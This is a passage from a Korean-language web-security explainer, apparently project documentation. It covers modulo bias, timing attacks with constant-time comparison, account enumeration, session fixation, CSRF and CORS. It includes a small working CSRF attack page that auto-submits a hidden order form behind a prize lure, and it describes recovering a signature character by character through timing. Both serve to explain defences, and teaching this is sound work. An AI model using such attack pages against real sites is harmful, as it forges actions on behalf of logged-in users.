128비트를 넘으면 지구의 모든 컴퓨터로 계속 넣어 봐도 맞힐 수 없다고 본다. 6자리 인증번호처럼 엔트로피가 작은 값은 시도 횟수 제한과 짧은 만료로 함께 지켜야 한다.

모듈로 편향

무작위 바이트(0~255)를 62로 나눈 나머지로 글자를 고르면 고르지 않다. 256은 62로 나누어떨어지지 않아서, 나머지 0~7이 다른 값보다 한 번씩 더 나온다. crypto.randomInt(62)는 이런 편향 없이 0~61을 고르게 뽑는다.

바이트 0~255% 62로 접으면
0~61 0~61 0~61 0~61 248~255 → 0~7 한 번 더

0~61은 네 바퀴를 온전히 돌고, 남은 8개(248~255)가 다시 0~7로 떨어진다. 그래서 0~7은 256번 중 5번, 나머지는 4번 나온다. 한 글자에서는 작은 차이지만 공격자가 노릴 수 있는 쏠림이다. randomInt는 남는 구간에 걸린 값을 버리고 다시 뽑아 이 쏠림을 없앤다. 

import { randomBytes, randomInt } from 'node:crypto';

const biased = randomBytes(1)[0] % 62; // 0~7이 조금 더 자주 나온다
const uniform = randomInt(62); // 0~61이 같은 확률로 나온다

타이밍 공격과 상수 시간 비교

문자열 비교 a === b는 앞에서부터 한 글자씩 보다가 다른 글자를 만나면 바로 멈춘다. 첫 글자가 틀리면 빨리 끝나고, 열 글자째에서 틀리면 조금 늦게 끝난다.

공격자가 서명을 한 글자씩 바꿔 가며 보내고 응답 시간을 아주 많이 재면, 어느 글자에서 조금 더 오래 걸렸는지로 맞는 글자를 하나씩 알아낼 수 있다. 금고 다이얼을 돌리며 딸깍 소리를 듣는 것과 같다. 이것이 타이밍 공격이다.

맞는 서명이 base64 44자 pexhWn01…이라고 하자. 공격자가 보낸 서명마다 ===가 몇 글자를 보고 멈추는지 그리면 이렇다(앞 8글자만 그렸다). 막대가 길수록 응답이 아주 조금 늦다.

2글자 비교
pexxxxxx…두 글자 맞음
3글자 비교

공격자는 첫 자리에 base64 글자 64가지를 하나씩 넣어 보고, 유독 오래 걸린 p를 찾는다. 그다음 둘째 자리를 같은 방법으로 찾는다. 한 번에 전부 맞혀야 하면 6444가지를 뒤져야 하지만, 한 자리씩 맞히면 많아야 64 × 44번의 추측으로 줄어든다. 실제 차이는 나노초 단위라 한 번 재서는 알 수 없고, 같은 요청을 아주 많이 보내 평균을 내야 한다.

막는 방법은 어디서 틀렸든 늘 끝까지 비교하는 것이다. Node의 crypto.timingSafeEqual이 그 일을 한다.

pexxxxxx…timingSafeEqual

어느 글자가 틀렸든 걸리는 시간이 같으므로, 시간을 재도 알 수 있는 것이 없다.

import { timingSafeEqual } from 'node:crypto';

const expected = Buffer.from(expectedSignature);
const actual = Buffer.from(receivedSignature);
// 길이가 다르면 timingSafeEqual이 예외를 던지므로 먼저 길이를 본다.
const ok = expected.length === actual.length && timingSafeEqual(expected, actual);

길이를 먼저 비교하면 길이는 드러나지만, 서명이나 해시처럼 길이가 정해진 값은 길이가 비밀이 아니므로 괜찮다.

시간 차이는 비교 함수에서만 생기지 않는다. "없는 계정이면 바로 응답, 있는 계정이면 느린 해시를 계산한 뒤 응답"처럼 코드 경로마다 걸리는 시간이 다르면 그 차이로도 정보가 드러난다(계정 열거).

계정 열거

계정 열거(account enumeration)는 서비스의 반응 차이로 어떤 이메일이 가입되어 있는지 알아내는 것이다. 가입된 이메일 목록을 알면 그 계정들에만 흔한 비밀번호를 넣어 보거나, 그 사람에게 그럴듯한 피싱 메일을 보낼 수 있다.

세션과 JWT

로그인 뒤 "이 요청은 42번 사용자가 보냈다"를 아는 방법은 크게 두 가지다.

  • 세션(서버가 기억하는 방식): 서버가 DB에 "토큰 abc는 42번 사용자, 7일 뒤 만료"를 적어 두고, 브라우저에는 의미 없는 토큰 abc만 준다. 요청마다 DB에서 찾아본다. 옷 보관소의 번호표와 같다. 번호표에는 아무 정보도 없고, 옷은 보관소에 있다.
  • JWT(토큰이 스스로 말하는 방식): "42번 사용자, 7일 뒤 만료"라는 내용 자체를 토큰에 담고 서버의 비밀키로 서명한다. 서버는 서명만 확인하면 되고 DB를 보지 않는다. 사진과 도장이 찍힌 신분증과 같다.

세션 고정

세션 고정(session fixation)은 공격자가 미리 알고 있는 세션 토큰을 피해자 브라우저에 심어 두고, 피해자가 그 토큰을 쓴 채로 로그인하기를 기다리는 공격이다. 로그인할 때 서버가 기존 토큰에 "이제 이 사람은 로그인했다"고만 적으면, 공격자는 자기가 아는 그 토큰으로 피해자로 로그인된다.

옷 보관소에 빗대면, 도둑이 번호표 7번을 미리 받아 손님 주머니에 넣어 두는 것과 같다. 손님이 그 번호표로 옷을 맡기면, 같은 번호를 아는 도둑도 그 옷을 찾아갈 수 있다.

심어 둔 토큰이 어떻게 유효한가

공격자가 지어낸 아무 값은 서버가 받아 주지 않는다. 그래서 이 공격은 심어 둔 X가 서버 입장에서 진짜 토큰일 때만 성립한다. X가 진짜가 되는 길은 두 가지다.

  1. 서버가 로그인 전에도 세션을 준다 장바구니, 최근 본 공연, 로그인 폼의 CSRF 토큰을 담으려고 처음 온 방문자에게도 세션을 만들어 주는 서버가 많다. 공격자는 그냥 사이트에 한 번 들어가 정식으로 발급된 X를 받는다. X는 서버 DB에 행이 있는 유효한 토큰이고, 아직 "누구인지 모름" 상태일 뿐이다.
  2. 서버가 브라우저가 보낸 처음 보는 값도 받아 준다 모르는 세션 id가 오면 그 id로 새 세션을 만들어 버리는 서버다. 예전 PHP 기본 설정이 이렇게 동작했다. 이때는 공격자가 X를 지어내도 된다.

어느 쪽이든 핵심은 같다. 서버가 로그인 성공 때 토큰은 그대로 두고 그 토큰이 가리키는 행의 내용만 바꾼다는 것이다.

허술한 서버: 같은 토큰 X의 행 내용만 바뀐다 Xuser: 없음 (로그인 전) 피해자가 로그인 Xuser: 피해자 공격자도 X를 안다
이 프로젝트: 새 토큰 Y가 생긴다 X있어도 피해자와 무관 피해자가 로그인 Yuser: 피해자 Y는 피해자 브라우저만 안다

아래 순서도는 첫 번째 길(로그인 전 세션)로 X를 얻는 경우다.

  6. 401 공격자는 Y를 모른다

막는 법은 간단하다. 로그인에 성공하면 늘 새 토큰을 만든다. 로그인 전에 누가 어떤 토큰을 심었든, 로그인한 사용자를 가리키는 토큰은 공격자가 본 적 없는 새 값이다. 공격을 막는 것은 이 새 토큰이다.

이 프로젝트의 SessionManager.issue는 로그인할 때마다 createSessionToken()으로 새 토큰을 만든다. 요청에 이전 쿠키가 실려 오면 그 세션 행도 지우는데, 이는 쓰지 않게 된 행을 치우는 정리다. 지우지 않더라도 X는 피해자 계정을 가리키지 않으므로 공격은 이미 실패한다. 위의 두 길도 모두 막혀 있다. 이 프로젝트는 로그인 전에는 세션을 만들지 않아 첫 번째 길이 없고, 쿠키는 AUTH_SECRET으로 서명되어 있어 공격자가 지어낸 X는 서명 확인에서 거절되므로 두 번째 길도 없다.

CSRF

CSRF(Cross-Site Request Forgery, 사이트 간 요청 위조)는 다른 사이트가 사용자의 브라우저를 시켜 로그인된 서비스로 요청을 보내게 하는 공격이다. 브라우저는 요청을 누가 시켰든 그 서비스의 쿠키를 싣기 때문에, 서버는 사용자가 직접 보낸 요청으로 착각한다.

  1. evil.com 페이지
  2. 사용자 브라우저
  3. shop.com 서버
  1. 사용자는 shop.com에 로그인해 둔 상태로 evil.com을 연다
  2. 숨은 폼을 자동 제출 <form action="https://shop.com/orders" method="POST">
  3. POST /orders shop.com 쿠키가 실려 간다
  4. 로그인한 사용자의 주문으로 처리

공격자는 응답을 읽지 못한다(CORS가 막는다). 하지만 요청이 서버에 닿아 주문, 탈퇴, 비밀번호 변경 같은 상태 변경이 일어나면 그것으로 충분하다. 그래서 CSRF 방어는 상태를 바꾸는 요청에 집중한다.

공격 페이지에 실제로 들어가는 코드는 이 정도다. 화면에는 "경품 당첨!"만 보이고 폼은 보이지 않는다.

<h1>경품 당첨!</h1>
<form id="f" action="https://shop.example.com/orders" method="POST" hidden>
  <input name="showId" value="7">
  <input name="seats" value="10">
</form>
<script>document.getElementById('f').submit();</script>

방어가 있으면 같은 공격이 어떻게 되나

SameSite=Lax 쿠키라면 3번 단계에서 브라우저가 쿠키를 빼고 보낸다. 서버는 로그인하지 않은 요청으로 보고 거절한다.

  1. evil.com 페이지
  2. 사용자 브라우저
  3. shop.example.com 서버
  1. 숨은 폼을 자동 제출
  2. 다른 사이트에서 시작된 POST다 SameSite=Lax 쿠키는 싣지 않는다
  3. POST /orders 쿠키 없음
  4. 401 로그인하지 않은 요청

여러 방어를 겹쳐 쓰는 것이 보통이다. 하나가 뚫려도 다른 하나가 막는다.

CORS

브라우저는 기본적으로 다른 출처의 응답을 페이지 자바스크립트가 읽지 못하게 한다(동일 출처 정책). store.example.com의 페이지가 api.example.com에 fetch를 보내면, 요청은 가지만 응답을 읽으려는 순간 막힌다.

CORS(Cross-Origin Resource Sharing)는 서버가 응답 헤더로 "이 출처는 내 응답을 읽어도 된다"고 허락하는 방법이다. 막는 것은 브라우저이고, 허락하는 것은 서버다.

허락이 없을 때: 요청은 가고, 응답은 숨긴다

  1. store.example.com 페이지
  2. 브라우저
  3. api.example.com
  1. fetch('https://api.example.com/me')
  2. GET /me Origin: https://store.example.com
  3. 200 본문은 있지만 Access-Control-Allow-Origin 헤더가 없다
  4. 출처가 다르고 허락도 없다 응답을 페이지에 넘기지 않는다
  5. TypeError: Failed to fetch

이때 개발자 도구 콘솔에는 이런 오류가 찍힌다. 서버는 이미 200으로 응답했다는 점에 주의한다.

Access to fetch at 'https://api.example.com/me' from origin 'https://store.example.com'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.

누가 응답을 읽을 수 있나

서버가 Access-Control-Allow-Origin: https://store.example.com만 허락했다고 하자.

① 허락된 출처
https://store.example.com
fetch(…, { credentials: 'include' })
GET /me
api.example.com허락: store.example.com

  • 서버에 닿음
  • 쿠키 실림
  • 응답 읽음
② 같은 사이트지만 허락되지 않은 출처
https://admin.example.com
fetch(…, { credentials: 'include' })
GET /me
api.example.com허락: store.example.com
같은 사이트라 쿠키는 실리지만 출처가 다르다 → 응답은 못 읽는다
  • 서버에 닿음
  • 쿠키 실림
  • 응답 읽음
③ 다른 사이트
https://evil.com
fetch(…, { credentials: 'include' })
GET /me
api.example.com허락: store.example.com
요청은 가지만 → 쿠키도 응답도 없다
  • 서버에 닿음
  • 쿠키 실림
  • 응답 읽음

세 장면 모두 요청은 서버에 닿는다. CORS가 정하는 것은 응답을 읽느냐뿐이다. 쿠키가 실리느냐는 SameSite가 정한다. 두 규칙이 보는 기준도 다르다. CORS는 출처를, SameSite는 사이트를 본다. 그래서 ②처럼 쿠키는 실리는데 응답은 못 읽는 경우가 생긴다.

쿠키를 함께 보내려면

fetch(url, { credentials: 'include' })로 쿠키를 실어 보내는 요청은 조건이 더 엄격하다.

  • Access-Control-Allow-Origin에 *를 쓸 수 없고, 정확한 출처를 적어야 한다.
  • Access-Control-Allow-Credentials: true가 있어야 한다.

①에서 api.example.com이 두 조건을 채워 보낸 응답 헤더는 이렇다.

Access-Control-Allow-Origin: https://store.example.com
Access-Control-Allow-Credentials: true

사전 요청(preflight)

"단순하지 않은" 요청(예: Content-Type: application/json, PUT/DELETE, 직접 만든 헤더)은 브라우저가 본 요청 전에 OPTIONS 요청을 먼저 보내 허락을 묻는다. 서버가 허락하지 않으면 본 요청은 아예 보내지 않는다.

  1. store.example.com 페이지
  2. 브라우저
  3. api.example.com
  1. fetch POST, JSON 본문, credentials: 'include'
  2. OPTIONS /orders Origin, Access-Control-Request-Method: POST
  3. 204 Allow-Origin: https://store.example.com, Allow-Credentials: true
  4. POST /orders 쿠키와 JSON 본문
  5. 201 같은 CORS 헤더
  6. 응답을 읽게 해 준다

CORS는 응답을 읽는 것을 허락하는 규칙이지, 요청을 막는 방어가 아니다. 폼 제출처럼 사전 요청이 없는 단순 요청은 CORS 허락과 상관없이 서버에 닿는다. 그래서 CORS 설정만으로는 CSRF를 막지 못한다.
